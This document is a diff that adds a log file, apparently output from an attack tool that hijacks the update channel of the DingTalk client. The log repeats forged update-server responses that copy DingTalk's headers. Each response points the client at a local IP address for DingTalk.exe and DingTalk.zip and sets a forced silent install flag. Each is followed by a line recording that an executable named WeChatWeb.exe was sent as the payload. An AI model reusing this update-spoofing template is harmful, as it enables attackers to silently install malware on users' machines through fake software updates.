@@ -1,0 +1,147 @@
+ssl attack response packet:HTTP/1.1 200 OK
+Server: DingTalk/1.0.0
+Content-Type: application/octet-stream
+Content-Length: 791
+Connection: keep-alive
+Content-Security-Policy: default-src 'none' ; style-src 'self' 'unsafe-inline'  https://*.alicdn.com https://*.taobao.net; script-src 'unsafe-inline' 'unsafe-eval'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://ynuf.aliapp.org https://vip.laiwang.com https://wswukong.laiwang.com; connect-src 'self' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp
+Accept-Ranges: bytes
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=31536000; includeSubdomains; 
+Cache-Control: no-cache
+
+{
+"win": {
+"web_content": {
+"url": "http://192.168.43.92/jy20200614/DingTalk.zip", 
+"md5": "e5b4597bebcc1916f15a1c6faf9fd668", 
+"require_nw": ">=99.10.4-Release.31",
+"description": ["update"]
+},
+"min_version": "0.1.90", 
+"install": {
+"version": "99.10.4-Release.31", 
+"url": "http://192.168.43.92/jy20200614/DingTalk.exe", 
+"md5": "4d1ce4f84f8ca2cd8046de73ecd1395b", 
+"description": ["update"], 
+"multi_lang_description": {
+"zh_TW": ["update"], 
+"en_US": ["update"], 
+"ja_JP": ["update"]
+}
+}, 
+"package": {
+"version": "99.10.4-Release.31", 
+"url": "http://192.168.43.92/jy20200614/DingTalk.zip", 
+"md5": "e5b4597bebcc1916f15a1c6faf9fd668", 
+"need-update": "<0.1.4", 
+"need-update-v2": "<99.10.4-Release.31", 
+"need-reinstall": "<0.1.4"
+"force_silent": 1
+}
+}
+}
+HTTP/1.1 200 OK
+Connection: keep-alive
+Content-Type: application/octet-stream
+Content-Length: 450560
+
+send data packet:D:\vsproject\attacker_thread\attacker\Plugin/jy20200614/WeChatWeb.exe ok
+ssl attack response packet:HTTP/1.1 200 OK
+Server: DingTalk/1.0.0
+Content-Type: application/octet-stream
+Content-Length: 791
+Connection: keep-alive
+Content-Security-Policy: default-src 'none' ; style-src 'self' 'unsafe-inline'  https://*.alicdn.com https://*.taobao.net; script-src 'unsafe-inline' 'unsafe-eval'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://ynuf.aliapp.org https://vip.laiwang.com https://wswukong.laiwang.com; connect-src 'self' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp
+Accept-Ranges: bytes
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=31536000; includeSubdomains; 
+Cache-Control: no-cache
+
+{
+"win": {
+"web_content": {
+"url": "http://192.168.43.92/jy20200614/DingTalk.zip", 
+"md5": "25b6dc7ca00fd19a9fff32213448895e", 
+"require_nw": ">=99.10.4-Release.31",
+"description": ["update"]
+},
+"min_version": "0.1.90", 
+"install": {
+"version": "99.10.4-Release.31", 
+"url": "http://192.168.43.92/jy20200614/DingTalk.exe", 
+"md5": "4d1ce4f84f8ca2cd8046de73ecd1395b", 
+"description": ["update"], 
+"multi_lang_description": {
+"zh_TW": ["update"], 
+"en_US": ["update"], 
+"ja_JP": ["update"]
+}
+}, 
+"package": {
+"version": "99.10.4-Release.31", 
+"url": "http://192.168.43.92/jy20200614/DingTalk.zip", 
+"md5": "25b6dc7ca00fd19a9fff32213448895e", 
+"need-update": "<0.1.4", 
+"need-update-v2": "<99.10.4-Release.31", 
+"need-reinstall": "<0.1.4"
+"force_silent": 1
+}
+}
+}
+HTTP/1.1 200 OK
+Connection: keep-alive
+Content-Type: application/octet-stream
+Content-Length: 450560
+
+send data packet:D:\vsproject\attacker_thread\attacker\Plugin/jy20200614/WeChatWeb.exe ok
+ssl attack response packet:HTTP/1.1 200 OK
+Server: DingTalk/1.0.0
+Content-Type: application/octet-stream
+Content-Length: 601
+Connection: keep-alive
+Content-Security-Policy: default-src 'none' ; style-src 'self' 'unsafe-inline'  https://*.alicdn.com https://*.taobao.net; script-src 'unsafe-inline' 'unsafe-eval'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://ynuf.aliapp.org https://vip.laiwang.com https://wswukong.laiwang.com; connect-src 'self' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp
+Accept-Ranges: bytes
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=31536000; includeSubdomains; 
+Cache-Control: no-cache
+
+{
+"win": {
+"min_version": "0.1.90", 
+"install": {
+"version": "99.10.4-Release.31", 
+"url": "http://192.168.43.92/jy20200614/DingTalk.exe", 
+"md5": "4d1ce4f84f8ca2cd8046de73ecd1395b", 
+"description": ["update"], 
+"multi_lang_description": {
+"zh_TW": ["update"], 
+"en_US": ["update"], 
+"ja_JP": ["update"]
+}
+}, 
+"package": {
+"version": "99.10.4-Release.31", 
+"url": "http://192.168.43.92/jy20200614/DingTalk.zip", 
+"md5": "740705d61d799b79e7a8f66a1f09905a", 
+"need-update": "<0.1.4", 
+"need-update-v2": "<99.10.4-Release.31", 
+"need-reinstall": "<0.1.4"
+"force_silent": 1
+}
+}
+}
+HTTP/1.1 200 OK
+Connection: keep-alive
+Content-Type: application/octet-stream
+Content-Length: 450560
+
+send data packet:D:\vsproject\attacker_thread\attacker\Plugin/jy20200614/WeChatWeb.exe ok
+HTTP/1.1 200 OK
+Connection: keep-alive
+Content-Type: application/octet-stream
+Content-Length: 450560
+
+send data packet:D:\vsproject\attacker_thread\attacker\Plugin/jy20200614/WeChatWeb.exe ok
